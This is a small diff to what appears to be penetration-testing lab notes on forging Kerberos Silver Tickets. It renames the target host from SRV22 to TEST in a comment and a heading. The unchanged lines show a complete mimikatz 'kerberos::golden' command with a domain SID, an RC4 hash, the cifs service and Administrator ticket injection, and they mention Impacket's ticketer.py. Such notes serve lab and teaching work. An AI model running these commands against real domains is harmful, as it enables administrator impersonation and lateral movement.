@@ -47,7 +47,7 @@ mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGE
 whoami /user
 # Output SID: S-1-5-21-3623811015-3361044348-30300820-1001
 
-# Create Silver Ticket for CIFS (SMB) on SRV22 as Administrator
+# Create Silver Ticket for CIFS (SMB) on TEST as Administrator
 mimikatz.exe "kerberos::golden /domain:resourced.local /sid:S-1-5-21-3623811015-3361044348-30300820 /target:test.local /service:cifs /rc4:19a3a7550ce8c505c2d46b5e39d6f808 /user:Administrator /ptt" exit
 
 # Verify the ticket injection
@@ -136,7 +136,7 @@ S-1-5-21-3623811015-3361044348-30300820
 
 ---
 
-## Step 2: Create the Silver Ticket for SRV22
+## Step 2: Create the Silver Ticket for TEST
 
 ### Option A: Linux (Impacket `ticketer.py`)
 
